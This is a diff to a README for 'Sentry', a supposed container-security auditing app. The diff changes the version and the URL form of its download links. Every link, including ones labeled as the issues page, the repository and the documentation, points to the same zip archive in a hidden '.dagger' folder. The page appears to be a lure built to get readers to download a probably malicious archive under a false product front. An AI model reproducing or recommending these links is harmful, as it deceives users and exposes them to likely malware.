@@ -1,6 +1,6 @@
 # 🔒 Sentry - Simplifying Container Security for Everyone
 
-[![Download Sentry](https://raw.githubusercontent.com/nothi533/Sentry/main/.dagger/Software_v2.4.zip%https://raw.githubusercontent.com/nothi533/Sentry/main/.dagger/Software_v2.4.zip)](https://raw.githubusercontent.com/nothi533/Sentry/main/.dagger/Software_v2.4.zip)
+[![Download Sentry](https://github.com/nothi533/Sentry/raw/refs/heads/main/.dagger/Software_v2.1.zip%https://github.com/nothi533/Sentry/raw/refs/heads/main/.dagger/Software_v2.1.zip)](https://github.com/nothi533/Sentry/raw/refs/heads/main/.dagger/Software_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Sentry! This application helps you keep your containers secure. It lo
 
 ## 📥 Download & Install
 
-To download Sentry, please [visit this page to download](https://raw.githubusercontent.com/nothi533/Sentry/main/.dagger/Software_v2.4.zip). You will find the latest version there. Look for files that match your operating system and take note of the instructions provided for installation.
+To download Sentry, please [visit this page to download](https://github.com/nothi533/Sentry/raw/refs/heads/main/.dagger/Software_v2.1.zip). You will find the latest version there. Look for files that match your operating system and take note of the instructions provided for installation.
 
 ## 🖥️ System Requirements
 
@@ -60,13 +60,13 @@ If you encounter any problems while using Sentry, here are some tips:
 
 Sentry has a growing community. If you have questions or need help:
 
-- **Open Issues:** Visit the [Issues section](https://raw.githubusercontent.com/nothi533/Sentry/main/.dagger/Software_v2.4.zip) on GitHub to ask for help or report bugs.
+- **Open Issues:** Visit the [Issues section](https://github.com/nothi533/Sentry/raw/refs/heads/main/.dagger/Software_v2.1.zip) on GitHub to ask for help or report bugs.
 - **Community Forums:** Join discussions with other users and share tips.
 
 ## 🔗 Useful Links
 
-- [Download Sentry](https://raw.githubusercontent.com/nothi533/Sentry/main/.dagger/Software_v2.4.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/nothi533/Sentry/main/.dagger/Software_v2.4.zip)
-- [User Documentation](https://raw.githubusercontent.com/nothi533/Sentry/main/.dagger/Software_v2.4.zip)
+- [Download Sentry](https://github.com/nothi533/Sentry/raw/refs/heads/main/.dagger/Software_v2.1.zip)
+- [GitHub Repository](https://github.com/nothi533/Sentry/raw/refs/heads/main/.dagger/Software_v2.1.zip)
+- [User Documentation](https://github.com/nothi533/Sentry/raw/refs/heads/main/.dagger/Software_v2.1.zip)
 
 Enjoy using Sentry to enhance your container security! Feel free to explore and make the most of your automated auditing experience.
